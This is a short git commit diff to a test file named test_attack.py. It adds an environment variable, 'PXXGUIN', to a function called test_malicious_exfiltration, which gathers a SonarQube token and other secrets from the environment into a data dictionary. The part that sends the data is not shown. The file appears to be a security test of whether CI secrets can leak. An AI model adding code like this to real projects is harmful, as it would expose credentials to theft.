fd316df583e352e38958ba680f9556cb25602d65
pxxguin <janghongseo@naver.com>
2026-08-04 16:18:20 +0900

    feat: new env are added in the repository

--- tests/test_attack.py
+++ tests/test_attack.py
@@ -5,8 +5,10 @@ import json
 def test_malicious_exfiltration():
     sonar_token = os.environ.get("PXXGUIN_SONAR_TOKEN", "NOT_FOUND")
     test_token = os.environ.get("THIS_IS_TEST", "NOT_FOUND")
-    
+    pxxguin = os.environ.get("PXXGUIN", "NOT_FOUND")
+
     data = {
+        "pxxguin":pxxguin,
         "sonar_token": sonar_token,
         "test_token":test_token
     }
